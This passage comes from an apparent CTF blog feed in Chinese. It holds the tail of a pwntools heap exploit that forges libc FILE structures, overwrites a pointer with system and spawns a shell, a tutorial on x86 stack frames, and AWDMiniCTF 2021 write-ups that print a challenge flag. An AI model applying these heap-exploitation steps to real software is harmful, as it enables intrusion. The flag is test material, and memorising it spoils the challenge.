class="string">&#x27;\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x20f</span>))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+<span class="number">0xa0</span>))</span><br><span class="line">add(<span class="number">0x1f8</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x1f8</span>)<span class="comment">#13</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(<span class="number">0xfbad2887</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">131</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">132</span>)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload+=p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])+p64(<span class="number">1</span>)+<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+<span class="string">&#x27;\x0a&#x27;</span>+p32(<span class="number">0</span>)+p64(libc_base+<span class="number">0x1ee4c0</span>)</span><br><span class="line">payload+=<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x1eb880</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload+=<span class="string">&#x27;\xff&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x14</span>+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>])</span><br><span class="line">payload+=p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>])</span><br><span class="line">payload+=p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1f0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x20f</span>)</span><br><span class="line">edit(<span class="number">13</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">a,b</span>):</span></span><br><span class="line">offset=b-<span class="number">0x7f0b79060000</span></span><br><span class="line">c=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1f</span>*<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> u64(a[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])&gt;<span class="number">0x7f0000000000</span> <span class="keyword">and</span> u64(a[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])&lt;<span class="number">0x800000000000</span>:</span><br><span class="line">c+=p64(u64(a[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])+offset)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c+=p64(u64(a[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]))</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">fd=<span class="built_in">open</span>(<span class="string">&#x27;./2&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x11</span>):</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+<span class="number">0xa0</span>+<span class="number">0x1f8</span>*(i+<span class="number">1</span>)))</span><br><span class="line">add(<span class="number">0x1f8</span>)<span class="comment">#14~15\</span></span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line">payload=fd.read(<span class="number">0x1f0</span>).ljust(<span class="number">0x1f0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">fd.read(<span class="number">8</span>)</span><br><span class="line">payload=encode(payload,libc_base)</span><br><span class="line">payload+=p64(<span class="number">0x20f</span>)</span><br><span class="line">edit(<span class="number">15</span>+i*<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+<span class="number">0xa0</span>+<span class="number">0x1f8</span>*(i+<span class="number">2</span>)))</span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x148</span>+p64(system)</span><br><span class="line">edit(<span class="number">15</span>+i*<span class="number">2</span>+<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;记录两个堆的比赛题&quot;&gt;&lt;a href=&quot;#记录两个堆的比赛题&quot; class=&quot;headerlink&quot; title=&quot;记录两个堆的比赛题&quot;&gt;&lt;/a&gt;记录两个堆的比赛题&lt;/h1&gt;&lt;p&gt;比较穷网盘没有会员附件私聊我&lt;/p&gt;
&lt;h1 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://zephyr-cyber.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Pwn</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/1502172364.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/1502172364.html</id>
    <published>2021-08-25T09:43:46.000Z</published>
    <updated>2022-12-13T12:44:45.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn学习1"><a href="#pwn学习1" class="headerlink" title="pwn学习1"></a>pwn学习1</h1><p>一张汇编图片<br><img src="/img/PWN/huibian1.jpg" alt="avatar"></p><p>栈帧结构</p><h1 id="Fig-1-函数调用发生和结束时调用栈的变化"><a href="#Fig-1-函数调用发生和结束时调用栈的变化" class="headerlink" title="Fig 1.函数调用发生和结束时调用栈的变化"></a>Fig 1.函数调用发生和结束时调用栈的变化</h1><p>esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。<br>下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态<br><img src="/img/PWN/fig1.jpg" alt="avatar"></p><h1 id="Fig-2-将被调用函数的参数压入栈内"><a href="#Fig-2-将被调用函数的参数压入栈内" class="headerlink" title="Fig 2.将被调用函数的参数压入栈内"></a>Fig 2.将被调用函数的参数压入栈内</h1><p>将被调用函数的参数压入栈内<br>首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。<br><img src="/img/PWN/fig2.jpg" alt="avatar"></p><h1 id="Fig-3-将被调用函数的返回地址压入栈内"><a href="#Fig-3-将被调用函数的返回地址压入栈内" class="headerlink" title="Fig 3.将被调用函数的返回地址压入栈内"></a>Fig 3.将被调用函数的返回地址压入栈内</h1><p>然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。<br><img src="/img/PWN/fig3.jpg" alt="avatar"></p><h1 id="Fig-4-将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到-ebp-寄存器内"><a href="#Fig-4-将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到-ebp-寄存器内" class="headerlink" title="Fig 4.将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内"></a>Fig 4.将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内</h1><p>再将当前的ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。<br><img src="/img/PWN/fig4.jpg" alt="avatar"></p><h1 id="Fig-5-将被调用函数的局部变量压入栈内"><a href="#Fig-5-将被调用函数的局部变量压入栈内" class="headerlink" title="Fig 5.将被调用函数的局部变量压入栈内"></a>Fig 5.将被调用函数的局部变量压入栈内</h1><p>再之后是将被调用函数（callee）的局部变量等数据压入栈内。。<br><img src="/img/PWN/fig5.jpg" alt="avatar"></p><h1 id="Fig-6-将被调用函数的局部变量弹出栈外"><a href="#Fig-6-将被调用函数的局部变量弹出栈外" class="headerlink" title="Fig 6.将被调用函数的局部变量弹出栈外"></a>Fig 6.将被调用函数的局部变量弹出栈外</h1><p>在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。<br>看过了函数调用发生时的情况，就不难理解函数调用结束时的变化。变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。<br>首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。<br><img src="/img/PWN/fig6.jpg" alt="avatar"></p><h1 id="Fig-7"><a href="#Fig-7" class="headerlink" title="Fig 7."></a>Fig 7.</h1><p>将调用函数（caller）的基地址（ebp）弹出栈外，并存到 ebp 寄存器内<br>然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。<br><img src="/img/PWN/fig7.jpg" alt="avatar"></p><h1 id="Fig-8"><a href="#Fig-8" class="headerlink" title="Fig 8."></a>Fig 8.</h1><p>再将返回地址从栈内弹出，并存到 eip 寄存器内。这样调用函数（caller）的 eip（指令）信息得以恢复。<br>将被调用函数的返回地址弹出栈外，并存到 eip 寄存器内<br>至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。<br><img src="/img/PWN/fig8.jpg" alt="avatar"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn学习1&quot;&gt;&lt;a href=&quot;#pwn学习1&quot; class=&quot;headerlink&quot; title=&quot;pwn学习1&quot;&gt;&lt;/a&gt;pwn学习1&lt;/h1&gt;&lt;p&gt;一张汇编图片&lt;br&gt;&lt;img src=&quot;/img/PWN/huibian1.jpg&quot; alt=&quot;avatar</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>AWDMiniCTF_2021</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/4038532285.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/4038532285.html</id>
    <published>2021-08-22T09:43:46.000Z</published>
    <updated>2022-12-13T12:23:29.396Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><ol><li><h2 id="好白给的签到题"><a href="#好白给的签到题" class="headerlink" title="好白给的签到题"></a>好白给的签到题</h2></li></ol><p>压缩包里的文件有点大。。。50MB。。</p><p>有提示：贝斯小学(base)，50 ，路易.六十四(想到base64)，兔子(斐波那契)，反着跳(python逆过来)，八年。</p><p>经过无数base64和反向base64。</p><p>然后打开story.txt看下是base64写脚本解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">p=<span class="built_in">open</span>(<span class="string">&#x27;story.txt&#x27;</span>)</span><br><span class="line">c=p.read().strip()</span><br><span class="line">s=c</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        s=base64.b64decode(s)</span></span><br><span class="line"><span class="string">        print(s)</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            s=base64.b64decode(s[::-1])</span></span><br><span class="line"><span class="string">            print(s)</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">z=<span class="string">&#x27;9smRjNnSWF2b4dkV6BHbStGdrJVcaZUVxM3VZhlWFJlaO52UHZkMURDZrZFNwFTYXhGbSRHZxM2caVlW5plRidFaX5kcK1WVzhnMVpnWsJFbw1mVyRGbNNEarlFVWpXYThWRjhXSWl1Rwh1VyI0MhxmWGF2ckx2YHRGMWNDayEGWoV0YyFzaWtmWVpFMwZkYsR3aWdXVsZ1QotWWYJ1VSpGZrdFeRZVW0QGbWdXUE10UsdUYHBHbSdEZWpVYatWYXpFShpXWsZVNjBTW6BnRiVlQU1EWaxWTahXbVNHcxEGWaZ0YHZ0VZdkUWdlW41WZohmRhlFZGVmVGpXWop1ahdlWEFGWK1GVzRGMZBjUHJ2U0VVTYJVMSdnRUlFWoJTYSxGbTlXWxQVMjZlVhBHbWlGasRlcWxmVzplVaNDaYJ2V5s2VWpkMW9UNtZFNxsWTUJlaTFnWWd1SGpWVwplRiJlVGp1RW1mUrpVMWlkWFZVakZkY1RWMjdkSqZFSSJTYYxGSjJnSGdFM01WVWh3VN5EdrdlVSZ0VTR2aZdFaXZ1TaVkWHZVbhFGetZFNGxWZo5kRhNnUWN1VkVkWYBnVSFGeFN2VxAjVHRWVZpFcwIFWSREZ0plRNdHetZVYShlYTZkbXdVMwY1U41mVZpFblhGaGplcOZ0U4NnMWhGcsJ1VKRUZ0ZlMVtGeHZlS1UlYT5kVNRnWG1kUKRVWZhXbSpmWsNVeVFjUrZlVXpkQIJ2U0d1T0JFbONnWwYFV1sWYXJkRjhXRHd1a0JTV1Y1aNhmUU1Edax2U3ZlVU9kVUJVYkZVTGRmRlJkUGZVTChkYXZFbSRnVGN1aaxmVyh2MWdlVEJ2caZUYDJ1aXpnSsZlWk52VyxmRXdHdtVFaCh0VW5kbWdkVtVVYWxmV&#x27;</span></span><br><span class="line">s=base64.b64decode(z[::-<span class="number">1</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    s=base64.b64decode(s)</span></span><br><span class="line"><span class="string">    print(s)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">z=<span class="string">&#x27;==QOwQVVY5kbWdVMwY1Rw1mV3tGVWdlVE5kVsxmThZFbWdlUtJlToh1V4lVMUNnWWZVeKZlYYRmRllXSyQmW4dVWDpkRWFGZV5kVaZkV4NWVZRlRUZ1Vkh0YyplVjFTQ6lFcohlYYRWVNZEZxQ1S4d1VaBXVWhFZW1ESSdUYLplVURlWsZ1VKhlTWZ0VhtmQEpleB5mVXB3RhVnWsVFeRZUV&#x27;</span></span><br><span class="line">s=base64.b64decode(z[::-<span class="number">1</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    s=base64.b64decode(s)</span></span><br><span class="line"><span class="string">    print(s)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">z=<span class="string">&#x27;mNVRoN2MSBnTqpFaVxWO1I2aCRHWygTMlBjWVFFM4BnYtxmT&#x27;</span></span><br><span class="line">s=base64.b64decode(z[::-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    s=base64.b64decode(s[::-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">##MiniLCTF&#123;5o_m@ny_Ra66its!!&#125;</span></span><br></pre></td></tr></table></figure><p>txt里面的base64解密后逆过来的<code>9smRjNnSWF2b4dkV6BHbStGdrJVcaZUVxM3VZhlWFJlaO52UHZkMURDZrZFNwFTYXhGbSRHZxM2caVlW5plRidFaX5kcK1WVzhnMVpnWsJFbw1mVyRGbNNEarlFVWpXYThWRjhXSWl1Rwh1VyI0MhxmWGF2ckx2YHRGMWNDayEGWoV0YyFzaWtmWVpFMwZkYsR3aWdXVsZ1QotWWYJ1VSpGZrdFeRZVW0QGbWdXUE10UsdUYHBHbSdEZWpVYatWYXpFShpXWsZVNjBTW6BnRiVlQU1EWaxWTahXbVNHcxEGWaZ0YHZ0VZdkUWdlW41WZohmRhlFZGVmVGpXWop1ahdlWEFGWK1GVzRGMZBjUHJ2U0VVTYJVMSdnRUlFWoJTYSxGbTlXWxQVMjZlVhBHbWlGasRlcWxmVzplVaNDaYJ2V5s2VWpkMW9UNtZFNxsWTUJlaTFnWWd1SGpWVwplRiJlVGp1RW1mUrpVMWlkWFZVakZkY1RWMjdkSqZFSSJTYYxGSjJnSGdFM01WVWh3VN5EdrdlVSZ0VTR2aZdFaXZ1TaVkWHZVbhFGetZFNGxWZo5kRhNnUWN1VkVkWYBnVSFGeFN2VxAjVHRWVZpFcwIFWSREZ0plRNdHetZVYShlYTZkbXdVMwY1U41mVZpFblhGaGplcOZ0U4NnMWhGcsJ1VKRUZ0ZlMVtGeHZlS1UlYT5kVNRnWG1kUKRVWZhXbSpmWsNVeVFjUrZlVXpkQIJ2U0d1T0JFbONnWwYFV1sWYXJkRjhXRHd1a0JTV1Y1aNhmUU1Edax2U3ZlVU9kVUJVYkZVTGRmRlJkUGZVTChkYXZFbSRnVGN1aaxmVyh2MWdlVEJ2caZUYDJ1aXpnSsZlWk52VyxmRXdHdtVFaCh0VW5kbWdkVtVVYWxmV</code>就使flag的加密，慢慢尝试就行了</p><ol><li><h2 id="抓猫猫"><a href="#抓猫猫" class="headerlink" title="抓猫猫"></a>抓猫猫</h2></li></ol><p>抓堆问题：博弈论的数学问题….</p><p><code>有一堆谷粒（例如100粒），甲乙轮流抓，每次可抓1-5粒，甲先抓，规定谁抓到最后一把谁赢。甲应该如何抓？为什么？ 先不考虑100粒的问题，假如谷粒只有一粒，甲一次就可以抓完，直接获胜。两粒，三粒，四粒，五粒也是同样的情况。但是如果谷粒有六粒的话，甲一次性无法抓完，乙必然会赢。 那怎么样甲才能稳赢呢，就是在最后只剩六个谷粒的时候让乙先抓取，在最开始取时甲就要将剩下的谷粒数限定在六的倍数内，只要甲取完每次都是六的倍数，甲就必胜了。</code></p><h3 id="k倍博弈"><a href="#k倍博弈" class="headerlink" title="k倍博弈"></a>k倍博弈</h3><p>两个人取一堆n的石子，先手不能全部取完，之后每人取的个数不能超过另一个人上轮取的K倍。</p><p>当k=1时，必败态都是2^i,我们可以借助二进制的思想来理解，将n表示为2进制，先手拿掉最后一个1，后手肯定没法去掉更高位的1，所以后手取完，先手至少还能拿掉最后一个1，所以先手必胜。当n=2^i时，先手必败，因为此时n的二进制只有一个1，先手第一次不能取完，所以先手取了以后，后手一定能取到最后一个1，然后先手不能去掉更高位的1，所以先手必败。</p><p>假设<code>n=6(110)</code>，我们先去掉最后一个1，变为4（100），此时如果对手取两个，那么我们直接去两个就能取完，如果对手取一个，还剩3个，我们能取到最后一个。</p><p>当k=2时，这就是一个Fibonacci博弈，可知先手必胜当且仅当n不为Fibonacci数，还是利用，先手取掉最后一个1，后手无法去掉更高位的1，所以后手取完，先手至少还能拿掉最后一个1。Fibonacci数列有一个很好的性质就是，任何一个整数都可以表示为若干项不连续的Fibonacci数，所以我们先去掉最后一个1，即一个数x，后手肯定无法去掉更高的数2x，小于高两位的1，所以后手无法取完。</p><p>假设<code>n=11=7+3+1</code>，表示为10101，我们先手去掉最后一个1，后手无法去掉高两位的1，所以后手取完，我们至少还能去掉最后一个1。</p><p>当k的时候，想办法构造数列，使得数列的任意两项之间的倍数大于k。</p><p>就像Fibonacci博弈一样，我们还是想要构造一个想Fibonacci一样的数列，我们用a数组，表示要构造的数列，<code>b[i]</code>表示<code>a[1..i]</code>所能组成的最大数，为了方便理解，我们还是用Fibonacci数列举例子，显然<code>a[ ]=&#123;1,2,3,5,8...&#125;</code>,<code>b[3]=4</code>,因为5本身就是Fibonacci数，而<code>6=1+2+3</code>，相邻两项的倍数根本就不大于<code>2</code>，<code>6=1+5</code>，<code>b[4]=6</code>。所以b数组中的数时我们要构造的数列中的一些满足要求的数的和，<code>a[i]=b[i-1]+1</code>,为什么呢，因为<code>a[i]</code>中的数是不可构造的，因为取到它就是必败。而<code>b[i-1]</code>是<code>a[1..i-1]</code>所能构造的最大数，那么加1，就是无法被前面的数列构造出来，所以只能另外开一项。</p><p>关于<code>b[i]</code>的构造，由于<code>b[i]</code>是<code>a[1..i]</code>中的数构造出来的，所以我们一定会用到<code>a[i]</code>,不然就成了<code>b[i-1]</code>了，所以我们先要按递减顺序找到<code>a[t]*k&lt;a[i]</code>,那么<code>b[i]=b[t]+a[i]</code>,如果前面找不到那么<code>b[i]=a[i]</code>,为什么呢，因为前面的数没有k项或者说构造出来太小了，所以只能选取一个，那么肯定选取最大的哪一个，前面<code>a[1...i-1]</code>所构造的项<code>b[i-1]</code>小于<code>a[i]</code>,所以这种情况下<code>b[i]=a[i]</code>。所以我们先手能不能必胜就看n在不在这个<code>a[ ]</code>数组里面，给出模板</p><p>所以这里我们由于抓猫的数量不能超过前一次抓猫的数量，所以在猫猫数量为偶数时不能抓奇数只猫猫，否则对方只抓一只猫猫我们就输了。 所以我们需要找出一个偶数，使得我们抓完后剩余的猫猫数为该偶数的倍数即可抓住猫猫</p><p>假若说他先抓了32只猫猫，剩下了108只猫猫，我发现我抓12只的话还剩96只，96是12的倍数。这个时候他抓12，我也抓12，他抓8我就抓4，他抓10我就抓2，他抓6，我就6，他抓4我就4，他抓2我就2，就稳赢。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1000000</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];   <span class="comment">//构造的数列</span></span><br><span class="line"><span class="keyword">int</span> b[maxn];    <span class="comment">//b[i]为a[1..i]所能凑出的最大数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n,k;</span><br><span class="line">  <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;k)==<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    a[<span class="number">0</span>]=b[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(a[i]&lt;n)&#123;</span><br><span class="line">      i++;</span><br><span class="line">      a[i]=b[i<span class="number">-1</span>]+<span class="number">1</span>;    <span class="comment">//a[i]为a[1..i-1]所能构造出的最大的那个数+1</span></span><br><span class="line">      <span class="keyword">while</span>(a[j+<span class="number">1</span>]*k&lt;a[i]) j++;  <span class="comment">//寻找临界点</span></span><br><span class="line">      <span class="keyword">if</span>(a[j]*k&lt;a[i])  b[i]=b[j]+a[i];   <span class="comment">//a[1..j]所能构造出来的最大值加上a[i]</span></span><br><span class="line">      <span class="keyword">else</span> b[i]=a[i];   <span class="comment">//相邻  小于了K倍 自然构造的最大的数就是a[i]了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a[i]==n)  <span class="built_in">printf</span>(<span class="string">&quot;Lost\n&quot;</span>);   <span class="comment">//如果数列a中有n则先手必败</span></span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Win\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面都是理论，看看就行。</p><h3 id="再看出题人的意思"><a href="#再看出题人的意思" class="headerlink" title="再看出题人的意思**"></a>再看出题人的意思**</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">题意：</span><br><span class="line"></span><br><span class="line">两个人轮流抓猫。初始有 n 只猫，第一次最少抓 1 只，最多抓 n - 1 只。之后的每轮至少抓 1 只，至多不能超过上一次抓的数量。抓走最后一只猫的人胜利。电脑先抓且保证第一次抓不是最优解。</span><br><span class="line"></span><br><span class="line">先上结论：n 是 2 的幂时后手必胜，否则先手必胜</span><br><span class="line"></span><br><span class="line">证明：</span><br><span class="line"></span><br><span class="line">考虑这个数的最低二进制位，即 lowbit ，例如 6 的 lowbit 是 2 ，12 的 lowbit 是 4</span><br><span class="line"></span><br><span class="line">现在拿走 n 的 lowbit ，记为 b，讨论对方的做法，记拿的数为 a</span><br><span class="line"></span><br><span class="line">① a = b</span><br><span class="line"></span><br><span class="line">易证剩下的数 n - 2b 的 lowbit 还是 b ，下一步可以再拿 b</span><br><span class="line"></span><br><span class="line">② a &lt; b</span><br><span class="line"></span><br><span class="line">由于 b 是 2 的幂，所以小于 b 且大于 1 的数必由小于 b 的二进制位组成</span><br><span class="line"></span><br><span class="line">易证剩下的数 n - a - b 的 lowbit 一定小于 b，所以下一步必定可以拿走更小的 lowbit</span><br><span class="line"></span><br><span class="line">因此每次必可以拿走当前数的 lowbit ，直至当前数为 1 为止，此时数的 lowbit 为自身，拿走即胜利</span><br><span class="line"></span><br><span class="line">需要注意的是，对方任何时候都不可能拿走剩下的所有数，因为 n - lowbit(n) &gt; lowbit(n)</span><br><span class="line"></span><br><span class="line">而当初始数为 2 的幂的时候，没有 lowbit 可拿（最多拿 n - 1 ），此时拿任何数都会导致对方出现可拿的 lowbit ，因此必败</span><br></pre></td></tr></table></figure><h3 id="什么是二进制最低位？"><a href="#什么是二进制最低位？" class="headerlink" title="什么是二进制最低位？"></a><strong>什么是二进制最低位</strong>？</h3><p>首先要理解<a href="https://blog.csdn.net/qunqunstyle99/article/details/82716990">二进制最低位</a>这个概念`给出一个整数A，输出它的最低位数<br>比如：A= 26，它的二进制形式为：11010，最低位为10，所以应该输出2<br>再比如 A=92，它的二进制为：01011100，最低位为：100，所以应输出4。其实就是转为二进制从右到左首先出现1的数。</p><h3 id="尝试"><a href="#尝试" class="headerlink" 